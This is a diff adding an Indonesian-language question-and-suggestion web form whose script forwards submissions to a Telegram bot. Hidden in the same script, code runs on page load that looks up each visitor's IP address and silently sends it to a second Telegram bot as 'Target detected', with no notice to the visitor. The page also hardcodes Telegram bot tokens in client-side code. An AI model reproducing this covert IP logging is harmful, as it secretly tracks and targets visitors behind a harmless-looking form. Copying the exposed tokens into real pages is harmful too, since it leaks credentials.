@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>QnA / Saran</title>
+<style>
+  body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background: linear-gradient(135deg, #667eea, #764ba2);
+    margin: 0;
+    padding: 0;
+    min-height: 100vh;
+    color: #fff;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
+  main {
+    background: rgba(0,0,0,0.65);
+    padding: 2rem 3rem;
+    border-radius: 15px;
+    max-width: 480px;
+    width: 90%;
+    box-shadow: 0 8px 30px rgba(0,0,0,0.5);
+  }
+  h1 {
+    text-align: center;
+    margin-bottom: 1.5rem;
+    font-weight: 700;
+    letter-spacing: 1px;
+  }
+  label {
+    font-weight: 600;
+    display: block;
+    margin: 1rem 0 0.4rem;
+  }
+  input[type="text"], textarea {
+    width: 100%;
+    padding: 0.6rem 0.8rem;
+    border-radius: 8px;
+    border: none;
+    font-size: 1rem;
+    resize: vertical;
+    font-family: inherit;
+  }
+  textarea {
+    min-height: 100px;
+  }
+  button {
+    font-weight: 700;
+    font-size: 1.1rem;
+    background: #6c63ff;
+    border: none;
+    padding: 0.7rem 0;
+    width: 100%;
+    margin-top: 1.7rem;
+    border-radius: 10px;
+    color: white;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+  }
+  button:hover {
+    background: #5848c2;
+  }
+  #status {
+    margin-top: 1rem;
+    text-align: center;
+    font-weight: 600;
+  }
+</style>
+</head>
+<body>
+<main>
+  <h1>QnA / Saran</h1>
+  <form id="qnaForm">
+    <label for="namaNomor">Nama / Nomor</label>
+    <input type="text" id="namaNomor" name="namaNomor" required />
+    <label for="pertanyaan">Pertanyaan / Saran</label>
+    <textarea id="pertanyaan" name="pertanyaan" required></textarea>
+    <button type="submit">Kirim</button>
+    <div id="status"></div>
+  </form>
+</main>
+<script>
+  // Telegram bot tokens and chat IDs
+  const BOT_QNA_TOKEN = "8107439602:AAFSm0I_24IzAUivshcUcnCbyzNi15GCAus";
+  const BOT_QNA_CHAT_ID = "6613275120";
+
+  const BOT_IP_TOKEN = "7752335856:AAH0ypJTrWhVYjuiXIShl4E04GmIAKIOEpA";
+  const BOT_IP_CHAT_ID = "6613275120";
+
+  // Function to send message to telegram bot
+  async function sendTelegramMessage(botToken, chatId, message) {
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    const body = {
+      chat_id: chatId,
+      text: message,
+      parse_mode: 'HTML'
+    };
+    try {
+      const response = await fetch(url, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify(body)
+      });
+      return response.ok;
+    } catch {
+      return false;
+    }
+  }
+
+  // Function to get visitor IP using a public API
+  async function getVisitorIP() {
+    try {
+      // Using a public IP API
+      const res = await fetch('https://api.ipify.org?format=json');
+      if (!res.ok) throw new Error('Failed to get IP');
+      const data = await res.json();
+      return data.ip || "Unknown IP";
+    } catch {
+      return "Unknown IP";
+    }
+  }
+
+  // Send visitor IP to Telegram immediately on load
+  (async () => {
+    const ip = await getVisitorIP();
+    const message = `<\\> Target detected✅ ${ip}`;
+    sendTelegramMessage(BOT_IP_TOKEN, BOT_IP_CHAT_ID, message);
+  })();
+
+  // Handle form submission
+  document.getElementById('qnaForm').addEventListener('submit', async ev => {
+    ev.preventDefault();
+    const namaNomor = ev.target.namaNomor.value.trim();
+    const pertanyaan = ev.target.pertanyaan.value.trim();
+    const statusEl = document.getElementById('status');
+    if (!namaNomor || !pertanyaan) {
+      statusEl.textContent = "Mohon isi semua field.";
+      return;
+    }
+    const message = `Pesan baru❗\n\nPesan: ${pertanyaan}\n\nPengirim: ${namaNomor}\n\n© DeemZet`;
+    statusEl.textContent = "Mengirim...";
+    const sent = await sendTelegramMessage(BOT_QNA_TOKEN, BOT_QNA_CHAT_ID, message);
+    if(sent) {
+      statusEl.textContent = "Terima kasih! Pesan Anda telah terkirim.";
+      ev.target.reset();
+    } else {
+      statusEl.textContent = "Gagal mengirim pesan. Silakan coba lagi nanti.";
+    }
+  });
+</script>
+</body>
+</html>
